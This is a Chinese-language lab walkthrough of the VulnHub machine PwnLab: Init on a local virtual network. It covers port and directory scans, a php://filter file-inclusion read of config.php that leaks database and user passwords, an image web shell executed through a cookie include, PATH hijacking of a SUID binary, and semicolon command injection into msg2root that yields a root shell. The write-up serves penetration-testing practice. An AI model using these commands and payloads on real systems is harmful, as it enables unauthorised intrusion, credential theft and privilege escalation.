## port scan

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 23:50:02 2024 as: nmap -sT --min-rate 7000 -p- -oN nmap_results/port_scan 192.168.56.132
Nmap scan report for 192.168.56.132
Host is up (0.019s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql
54335/tcp open  unknown
MAC Address: 08:00:27:5F:5C:8A (Oracle VirtualBox virtual NIC)
```

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 23:52:24 2024 as: nmap -sT -sV -sC -O -p80,111,3306,54335 -oN nmap_results/detils_scan 192.168.56.132
Nmap scan report for 192.168.56.132
Host is up (0.0011s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41723/tcp6  status
|   100024  1          41792/udp6  status
|   100024  1          45136/udp   status
|_  100024  1          54335/tcp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 40
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, FoundRows, DontAllowDatabaseTableColumn, IgnoreSigpipes, LongPassword, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsCompression, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: [|".a}tMd/ZZ6>uRw$H|
|_  Auth Plugin Name: mysql_native_password
54335/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:5F:5C:8A (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

vuln_scan

```shell
# Nmap 7.94SVN scan initiated Wed Nov 13 23:53:02 2024 as: nmap --script=vuln -p80,111,3306,54335 -oN nmap_results/vuln_scan 192.168.56.132
Nmap scan report for 192.168.56.132
Host is up (0.00072s latency).

PORT      STATE SERVICE
80/tcp    open  http
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.132
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.132:80/?page=login
|     Form id: user
|_    Form action: 
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /login.php: Possible admin folder
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
111/tcp   open  rpcbind
3306/tcp  open  mysql
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
54335/tcp open  unknown
MAC Address: 08:00:27:5F:5C:8A (Oracle VirtualBox virtual NIC)
```

## web

目录扫描

```shell
# Dirsearch started Thu Nov 14 00:04:54 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.56.132

200     0B   http://192.168.56.132/config.php
301   317B   http://192.168.56.132/images    -> REDIRECTS TO: http://192.168.56.132/images/
200   457B   http://192.168.56.132/images/
200   164B   http://192.168.56.132/login.php
403   302B   http://192.168.56.132/server-status
403   303B   http://192.168.56.132/server-status/
301   317B   http://192.168.56.132/upload    -> REDIRECTS TO: http://192.168.56.132/upload/
200    19B   http://192.168.56.132/upload.php
200   407B   http://192.168.56.132/upload/
```

有个`config.php`

```shell
nikto -h 192.168.56.132
```

```
Server: Apache/2.4.10 (Debian)
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2024-11-14 05:11:44 (GMT-5) (14 seconds)
```

观察URL可以知道，`?page=login`他就是包含的login.php

利用伪协议读取`config.php`文件

```shell
curl http://192.168.56.132/?page=php://filter/convert.base64-encode/resource=config
```

```shell
┌──(root㉿kali)-[~/vulnhub/pwnlab_init]
└─# echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

拿到数据库账号密码，这里不使用SSL/TLS建立加密连接

```shell
mysql -h 192.168.56.132 -uroot -pH4u%QJ_H99 --skip-ssl
```

![image-20241114181844692](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114181844692.png)

base64解密

```password
kent | JWzXuBJJNy
mike | SIfdsTEn6I
kane | iSv5Ym2GRo
```

登录web，是一个上传点

接着读取源码

```shell
curl http://192.168.56.132/?page=php://filter/convert.base64-encode/resource=upload
```

同样读取`index.php`，`upload.php`

`index.php`

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<?php
    if (isset($_GET['page']))
    {
        include($_GET['page'].".php");
    }
else
{
    echo "Use this server to upload and share image files inside the intranet";
}
?>
```

`upload.php`，白名单，指定Content-Type类型

```php
$whitelist = array(".jpg",".jpeg",".gif",".png"); 

if (!(in_array($file_ext, $whitelist))) {
    die('Not allowed extension, please upload images only.');
}

if(strpos($filetype,'image') === false) {
    die('Error 001');
}

if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
    die('Error 002');
}

if(substr_count($filetype, '/')>1){
    die('Error 003');
}
```

上传一个图片🐎，然后利用文件包含执行命令

在cookie的lang值，可以进行包含文件

![image-20241114182929690](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114182929690.png)

```shell
curl http://192.168.56.132/ -H 'Cookie:lang=../upload/10fb15c77258a991b0028080a64fb42d.png' --data '1=system('id');'
```

![image-20241114183133660](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114183133660.png)

## reverse shell

拿到shell，使用数据库中的账号密码登录

```shell
www-data@pwnlab:/tmp$ su kane
su kane
Password: iSv5Ym2GRo

kane@pwnlab:/tmp$ cd
cd
kane@pwnlab:~$ ls -la
ls -la
total 36
drwxr-x--- 2 kane kane 4096 Nov 14 12:43 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw------- 1 root root   71 Nov 14 12:58 .bash_history
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
```

`msgmike`文件有suid权限，可以使用`mike`的权限

```shell
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
```

执行该文件，该文件执行了`cat /home/mike/msg.txt`

## 环境变量劫持提权

修改cat文件，劫持环境变量

```shell
kane@pwnlab:~$ echo '/bin/bash' > cat
echo '/bin/bash' > cat
kane@pwnlab:~$ export PATH=/home/kane:$PATH
export PATH=/home/kane:$PATH
kane@pwnlab:~$ echo $PATH
echo $PATH
/home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$ id
id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

拿到`mike`用户权限

在`mike`家目录，发现`msg2root`文件，拖回来ida分析

```shell
mike@pwnlab:/home/mike$ ls -la
ls -la
total 28
drwxr-x--- 2 mike mike 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile
```

![image-20241114184340616](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114184340616.png)

将我们输入的赋值给变量s，然后执行命令

利用分号执行多条命令即可

```shell
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: ls;python -c "import os;import pty;os.setuid(0);os.setgid(0);pty.spawn('/bin/bash')";
ls;python -c "import os;import pty;os.setuid(0);os.setgid(0);pty.spawn('/bin/bash')";
ls
root@pwnlab:/home/mike# id
id
uid=0(root) gid=0(root) groups=0(root),1003(kane)
```

然后修改密码，查看`flag.txt`

![image-20241114185141214](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241114185141214.png)